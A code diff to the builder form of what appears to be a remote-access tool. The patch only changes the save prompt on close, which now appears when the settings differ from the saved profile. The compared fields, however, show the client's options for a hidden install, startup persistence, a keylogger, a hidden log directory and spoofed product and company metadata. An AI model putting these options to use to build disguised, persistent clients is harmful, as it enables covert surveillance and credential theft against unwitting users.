@@ -105,12 +105,18 @@ namespace xServer.Forms
 
         private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
         {
-            if (_changed &&
-                MessageBox.Show("Do you want to save your current settings?", "Changes detected",
-                    MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+            if (_changed)
             {
-                SaveProfile("Default");
+                 var profile = new BuilderProfile("Default");
+                 if(!(profile.Tag == txtTag.Text  &&  profile.Hosts == HostHelper.GetRawHosts(_hosts)  &&  profile.Password == txtPassword.Text  &&  profile.Delay == (int)numericUpDownDelay.Value  &&  profile.Mutex == txtMutex.Text  &&  profile.InstallClient == chkInstall.Checked  &&  profile.InstallName == txtInstallname.Text  &&  profile.InstallPath == GetInstallPath()  &&  profile.InstallSub == txtInstallsub.Text  &&  profile.HideFile == chkHide.Checked  &&  profile.AddStartup == chkStartup.Checked  &&  profile.RegistryName == txtRegistryKeyName.Text  &&  profile.ChangeIcon == chkChangeIcon.Checked  &&  profile.IconPath == txtIconPath.Text  &&  profile.ChangeAsmInfo == chkChangeAsmInfo.Checked  &&  profile.Keylogger == chkKeylogger.Checked  &&  profile.LogDirectoryName == txtLogDirectoryName.Text  &&  profile.HideLogDirectory == chkHideLogDirectory.Checked  &&  profile.ProductName == txtProductName.Text  &&  profile.Description == txtDescription.Text  &&  profile.CompanyName == txtCompanyName.Text  &&  profile.Copyright == txtCopyright.Text  &&  profile.Trademarks == txtTrademarks.Text  &&  profile.OriginalFilename == txtOriginalFilename.Text  &&  profile.ProductVersion == txtProductVersion.Text  &&  profile.FileVersion == txtFileVersion.Text))
+                 {
+                     if (MessageBox.Show("Do you want to save your current settings?", "Changes detected", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                     {
+                            SaveProfile("Default");
+                     }
+                }
             }
+        
         }
 
         private void btnAddHost_Click(object sender, EventArgs e)
